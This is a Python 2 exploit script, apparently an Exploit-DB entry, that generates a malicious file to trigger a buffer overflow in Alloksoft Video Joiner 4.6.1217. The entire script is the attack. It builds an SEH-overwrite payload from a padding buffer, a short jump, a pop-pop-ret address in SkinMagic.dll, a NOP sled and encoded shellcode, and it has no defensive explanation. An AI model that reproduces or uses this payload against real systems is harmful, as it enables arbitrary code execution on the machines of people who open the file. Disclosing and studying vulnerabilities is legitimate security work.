#!/usr/bin/python

# Exploit Title:  Alloksoft Video joiner (4.6.1217) - Buffer Overflow Vulnerability
# Date: 01/12/2018
# Exploit Author: Samir Sanchez Garnica @sasaga92
# Vendor Homepage: http://www.alloksoft.com
# Software Link: http://www.alloksoft.com/joiner.htm
# Version: 4.6.1217
# Tested: Windows 10 PRO Es
# CVE : N/D

import sys
import random
import string
import struct

def pattern_create(_type,_length):
	if _type == "trash":
		return "A" * _length
	elif _type == "random":
		return ''.join(random.choice(string.lowercase) for i in range(_length))
	elif _type == "pattern":
		_pattern = ''
		_parts = ['A', 'a', '0']
		while len(_pattern) != _length:
			_pattern += _parts[len(_pattern) % 3]
			if len(_pattern) % 3 == 0:
				_parts[2] = chr(ord(_parts[2]) + 1)
				if _parts[2] > '9':
					_parts[2] = '0'
					_parts[1] = chr(ord(_parts[1]) + 1)
					if _parts[1] > 'z':
						_parts[1] = 'a'
						_parts[0] = chr(ord(_parts[0]) + 1)
						if _parts[0] > 'Z':
							_parts[0] = 'A'
		return _pattern
	else:
		return "Not Found"


def generate_file(_name_file, _payload):
	print _payload
	print "[+] Creando Archivo malicioso"
	_name_file = open(_name_file,"w+")
	_name_file.write(_payload)
	_name_file.close()
	print "[+] Payload de {0} bytes generado, exitosamente.".format(len(_payload))

def main():

	_shellcode = ("\xd9\xc3\xd9\x74\x24\xf4\xbd\xb8\x1c\x39\x5f\x58\x2b\xc9"
	          "\xb1\x31\x83\xe8\xfc\x31\x68\x14\x03\x68\xac\xfe\xcc\xa3"
	          "\x24\x7c\x2e\x5c\xb4\xe1\xa6\xb9\x85\x21\xdc\xca\xb5\x91"
	          "\x96\x9f\x39\x59\xfa\x0b\xca\x2f\xd3\x3c\x7b\x85\x05\x72"
	          "\x7c\xb6\x76\x15\xfe\xc5\xaa\xf5\x3f\x06\xbf\xf4\x78\x7b"
	          "\x32\xa4\xd1\xf7\xe1\x59\x56\x4d\x3a\xd1\x24\x43\x3a\x06"
	          "\xfc\x62\x6b\x99\x77\x3d\xab\x1b\x54\x35\xe2\x03\xb9\x70"
	          "\xbc\xb8\x09\x0e\x3f\x69\x40\xef\xec\x54\x6d\x02\xec\x91"
	          "\x49\xfd\x9b\xeb\xaa\x80\x9b\x2f\xd1\x5e\x29\xb4\x71\x14"
	          "\x89\x10\x80\xf9\x4c\xd2\x8e\xb6\x1b\xbc\x92\x49\xcf\xb6"
	          "\xae\xc2\xee\x18\x27\x90\xd4\xbc\x6c\x42\x74\xe4\xc8\x25"
	          "\x89\xf6\xb3\x9a\x2f\x7c\x59\xce\x5d\xdf\x37\x11\xd3\x65"
	          "\x75\x11\xeb\x65\x29\x7a\xda\xee\xa6\xfd\xe3\x24\x83\xfc"
	          "\x12\xf5\x19\x68\x8d\x6c\x60\xf4\x2e\x5b\xa6\x01\xad\x6e"
	          "\x56\xf6\xad\x1a\x53\xb2\x69\xf6\x29\xab\x1f\xf8\x9e\xcc"
	          "\x35\x9b\x41\x5f\xd5\x72\xe4\xe7\x7c\x8b")
	_name_exploit = "EDB-ID-44634_AlloksoftVIdeoJoiner_4.6.1217.txt"

	_buffer = 4000
	_offset_eip = 780
	_nops = "\x90" * 20
	_nseh = "\x90\x90\xeb\x10"
	_seh = struct.pack("<L",0x10019A09) #pop eax # pop ebp # retn 0Ch SkinMagic.dll 3 8 one-reg, stack eax, ebp  nonull) #pop eax # pop ebp # retn SkinMagic.dll 3 8 one-reg, stack eax, ebp  nonull, ascii
	_inject = pattern_create("trash",_offset_eip)
	_inject += _nseh
	_inject += _seh
	_inject += _nops
	_inject += _shellcode
	_inject += "D" * (_buffer-len(_inject))

	generate_file(_name_exploit, _inject)

if __name__ == "__main__":
    main()